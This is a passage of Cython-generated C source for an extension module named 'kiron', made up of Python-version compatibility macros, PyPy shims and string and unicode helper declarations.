  #define __Pyx_PyObject_GC_IsFinalized(o) PyObject_GC_IsFinalized(o)
#else
  #define __Pyx_PyObject_GC_IsFinalized(o) _PyGC_FINALIZED(o)
#endif
#ifndef CO_COROUTINE
  #define CO_COROUTINE 0x80
#endif
#ifndef CO_ASYNC_GENERATOR
  #define CO_ASYNC_GENERATOR 0x200
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef Py_TPFLAGS_SEQUENCE
  #define Py_TPFLAGS_SEQUENCE 0
#endif
#ifndef Py_TPFLAGS_MAPPING
  #define Py_TPFLAGS_MAPPING 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #if PY_VERSION_HEX >= 0x030d00A4
  #  define __Pyx_PyCFunctionFast PyCFunctionFast
  #  define __Pyx_PyCFunctionFastWithKeywords PyCFunctionFastWithKeywords
  #else
  #  define __Pyx_PyCFunctionFast _PyCFunctionFast
  #  define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
  #endif
#endif
#if CYTHON_METH_FASTCALL
  #define __Pyx_METH_FASTCALL METH_FASTCALL
  #define __Pyx_PyCFunction_FastCall __Pyx_PyCFunctionFast
  #define __Pyx_PyCFunction_FastCallWithKeywords __Pyx_PyCFunctionFastWithKeywords
#else
  #define __Pyx_METH_FASTCALL METH_VARARGS
  #define __Pyx_PyCFunction_FastCall PyCFunction
  #define __Pyx_PyCFunction_FastCallWithKeywords PyCFunctionWithKeywords
#endif
#if CYTHON_VECTORCALL
  #define __pyx_vectorcallfunc vectorcallfunc
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  PY_VECTORCALL_ARGUMENTS_OFFSET
  #define __Pyx_PyVectorcall_NARGS(n)  PyVectorcall_NARGS((size_t)(n))
#elif CYTHON_BACKPORT_VECTORCALL
  typedef PyObject *(*__pyx_vectorcallfunc)(PyObject *callable, PyObject *const *args,
                                            size_t nargsf, PyObject *kwnames);
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  ((size_t)1 << (8 * sizeof(size_t) - 1))
  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(((size_t)(n)) & ~__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET))
#else
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  0
  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(n))
#endif
#if PY_MAJOR_VERSION >= 0x030900B1
#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_CheckExact(func)
#else
#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_Check(func)
#endif
#define __Pyx_CyOrPyCFunction_Check(func)  PyCFunction_Check(func)
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  (((PyCFunctionObject*)(func))->m_ml->ml_meth)
#elif !CYTHON_COMPILING_IN_LIMITED_API
#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  PyCFunction_GET_FUNCTION(func)
#endif
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_CyOrPyCFunction_GET_FLAGS(func)  (((PyCFunctionObject*)(func))->m_ml->ml_flags)
static CYTHON_INLINE PyObject* __Pyx_CyOrPyCFunction_GET_SELF(PyObject *func) {
    return (__Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_STATIC) ? NULL : ((PyCFunctionObject*)func)->m_self;
}
#endif
static CYTHON_INLINE int __Pyx__IsSameCFunction(PyObject *func, void *cfunc) {
#if CYTHON_COMPILING_IN_LIMITED_API
    return PyCFunction_Check(func) && PyCFunction_GetFunction(func) == (PyCFunction) cfunc;
#else
    return PyCFunction_Check(func) && PyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;
#endif
}
#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCFunction(func, cfunc)
#if __PYX_LIMITED_VERSION_HEX < 0x030900B1
  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  ((void)m, PyType_FromSpecWithBases(s, b))
  typedef PyObject *(*__Pyx_PyCMethod)(PyObject *, PyTypeObject *, PyObject *const *, size_t, PyObject *);
#else
  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  PyType_FromModuleAndSpec(m, s, b)
  #define __Pyx_PyCMethod  PyCMethod
#endif
#ifndef METH_METHOD
  #define METH_METHOD 0x200
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyThreadState_Current PyThreadState_Get()
#elif !CYTHON_FAST_THREAD_STATE
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x030d00A1
  #define __Pyx_PyThreadState_Current PyThreadState_GetUnchecked()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
static CYTHON_INLINE void *__Pyx_PyModule_GetState(PyObject *op)
{
    void *result;
    result = PyModule_GetState(op);
    if (!result)
        Py_FatalError("Couldn't find the module state");
    return result;
}
#endif
#define __Pyx_PyObject_GetSlot(obj, name, func_ctype)  __Pyx_PyType_GetSlot(Py_TYPE(obj), name, func_ctype)
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((func_ctype) PyType_GetSlot((type), Py_##name))
#else
  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((type)->name)
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if PY_MAJOR_VERSION < 3
    #if CYTHON_COMPILING_IN_PYPY
        #if PYPY_VERSION_NUM < 0x07030600
            #if defined(__cplusplus) && __cplusplus >= 201402L
                [[deprecated("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6")]]
            #elif defined(__GNUC__) || defined(__clang__)
                __attribute__ ((__deprecated__("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6")))
            #elif defined(_MSC_VER)
                __declspec(deprecated("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6"))
            #endif
            static CYTHON_INLINE int PyGILState_Check(void) {
                return 0;
            }
        #else  // PYPY_VERSION_NUM < 0x07030600
        #endif  // PYPY_VERSION_NUM < 0x07030600
    #else
        static CYTHON_INLINE int PyGILState_Check(void) {
            PyThreadState * tstate = _PyThreadState_Current;
            return tstate && (tstate == PyGILState_GetThisThreadState());
        }
    #endif
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030d0000 || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX > 0x030600B4 && PY_VERSION_HEX < 0x030d0000 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStrWithError(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
static CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStr(PyObject *dict, PyObject *name) {
    PyObject *res = __Pyx_PyDict_GetItemStrWithError(dict, name);
    if (res == NULL) PyErr_Clear();
    return res;
}
#elif PY_MAJOR_VERSION >= 3 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07020000)
#define __Pyx_PyDict_GetItemStrWithError  PyDict_GetItemWithError
#define __Pyx_PyDict_GetItemStr           PyDict_GetItem
#else
static CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStrWithError(PyObject *dict, PyObject *name) {
#if CYTHON_COMPILING_IN_PYPY
    return PyDict_GetItem(dict, name);
#else
    PyDictEntry *ep;
    PyDictObject *mp = (PyDictObject*) dict;
    long hash = ((PyStringObject *) name)->ob_shash;
    assert(hash != -1);
    ep = (mp->ma_lookup)(mp, name, hash);
    if (ep == NULL) {
        return NULL;
    }
    return ep->me_value;
#endif
}
#define __Pyx_PyDict_GetItemStr           PyDict_GetItem
#endif
#if CYTHON_USE_TYPE_SLOTS
  #define __Pyx_PyType_GetFlags(tp)   (((PyTypeObject *)tp)->tp_flags)
  #define __Pyx_PyType_HasFeature(type, feature)  ((__Pyx_PyType_GetFlags(type) & (feature)) != 0)
  #define __Pyx_PyObject_GetIterNextFunc(obj)  (Py_TYPE(obj)->tp_iternext)
#else
  #define __Pyx_PyType_GetFlags(tp)   (PyType_GetFlags((PyTypeObject *)tp))
  #define __Pyx_PyType_HasFeature(type, feature)  PyType_HasFeature(type, feature)
  #define __Pyx_PyObject_GetIterNextFunc(obj)  PyIter_Next
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_SetItemOnTypeDict(tp, k, v) PyObject_GenericSetAttr((PyObject*)tp, k, v)
#else
  #define __Pyx_SetItemOnTypeDict(tp, k, v) PyDict_SetItem(tp->tp_dict, k, v)
#endif
#if CYTHON_USE_TYPE_SPECS && PY_VERSION_HEX >= 0x03080000
#define __Pyx_PyHeapTypeObject_GC_Del(obj)  {\
    PyTypeObject *type = Py_TYPE((PyObject*)obj);\
    assert(__Pyx_PyType_HasFeature(type, Py_TPFLAGS_HEAPTYPE));\
    PyObject_GC_Del(obj);\
    Py_DECREF(type);\
}
#else
#define __Pyx_PyHeapTypeObject_GC_Del(obj)  PyObject_GC_Del(obj)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define CYTHON_PEP393_ENABLED 1
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GetLength(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_ReadChar(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((void)u, 1114111U)
  #define __Pyx_PyUnicode_KIND(u)         ((void)u, (0))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)u)
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)k, PyUnicode_ReadChar((PyObject*)(d), i))
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GetLength(u))
#elif PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         ((int)PyUnicode_KIND(u))
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, (Py_UCS4) ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535U : 1114111U)
  #define __Pyx_PyUnicode_KIND(u)         ((int)sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = (Py_UNICODE) ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #if !defined(PyUnicode_DecodeUnicodeEscape)
    #define PyUnicode_DecodeUnicodeEscape(s, size, errors)  PyUnicode_Decode(s, size, "unicode_escape", errors)
  #endif
  #if !defined(PyUnicode_Contains) || (PY_MAJOR_VERSION == 2 && PYPY_VERSION_NUM < 0x07030500)
    #undef PyUnicode_Contains
    #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
  #endif
  #if !defined(PyByteArray_Check)
    #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
  #endif
  #if !defined(PyObject_Format)
    #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
  #endif
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#if CYTHON_COMPILING_IN_CPYTHON
  #define __Pyx_PySequence_ListKeepNew(obj)\
    (likely(PyList_CheckExact(obj) && Py_REFCNT(obj) == 1) ? __Pyx_NewRef(obj) : PySequence_List(obj))
#else
  #define __Pyx_PySequence_ListKeepNew(obj)  PySequence_List(obj)
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        __Pyx_IS_TYPE(obj, &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_ITEM(o, i) PySequence_ITEM(o, i)
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
  #define __Pyx_PyTuple_SET_ITEM(o, i, v) (PyTuple_SET_ITEM(o, i, v), (0))
  #define __Pyx_PyList_SET_ITEM(o, i, v) (PyList_SET_ITEM(o, i, v), (0))
  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_GET_SIZE(o)
  #define __Pyx_PyList_GET_SIZE(o) PyList_GET_SIZE(o)
  #define __Pyx_PySet_GET_SIZE(o) PySet_GET_SIZE(o)
  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_GET_SIZE(o)
  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_GET_SIZE(o)
#else
  #define __Pyx_PySequence_ITEM(o, i) PySequence_GetItem(o, i)
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
  #define __Pyx_PyTuple_SET_ITEM(o, i, v) PyTuple_SetItem(o, i, v)
  #define __Pyx_PyList_SET_ITEM(o, i, v) PyList_SetItem(o, i, v)
  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_Size(o)
  #define __Pyx_PyList_GET_SIZE(o) PyList_Size(o)
  #define __Pyx_PySet_GET_SIZE(o) PySet_Size(o)
  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_Size(o)
  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_Size(o)
#endif
#if __PYX_LIMITED_VERSION_HEX >= 0x030d00A1
  #define __Pyx_PyImport_AddModuleRef(name) PyImport_AddModuleRef(name)
#else
  static CYTHON_INLINE PyObject *__Pyx_PyImport_AddModuleRef(const char *name) {
      PyObject *module = PyImport_AddModule(name);
      Py_XINCREF(module);
      return module;
  }
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define __Pyx_Py3Int_Check(op)       PyLong_Check(op)
  #define __Pyx_Py3Int_CheckExact(op)  PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#else
  #define __Pyx_Py3Int_Check(op)       (PyLong_Check(op) || PyInt_Check(op))
  #define __Pyx_Py3Int_CheckExact(op)  (PyLong_CheckExact(op) || PyInt_CheckExact(op))
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__;  (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifdef CYTHON_EXTERN_C
    #undef __PYX_EXTERN_C
    #define __PYX_EXTERN_C CYTHON_EXTERN_C
#elif defined(__PYX_EXTERN_C)
    #ifdef _MSC_VER
    #pragma message ("Please do not define the '__PYX_EXTERN_C' macro externally. Use 'CYTHON_EXTERN_C' instead.")
    #else
    #warning Please do not define the '__PYX_EXTERN_C' macro externally. Use 'CYTHON_EXTERN_C' instead.
    #endif
#else
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__kiron
#define __PYX_HAVE_API__kiron
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s);
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
static CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char*);
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
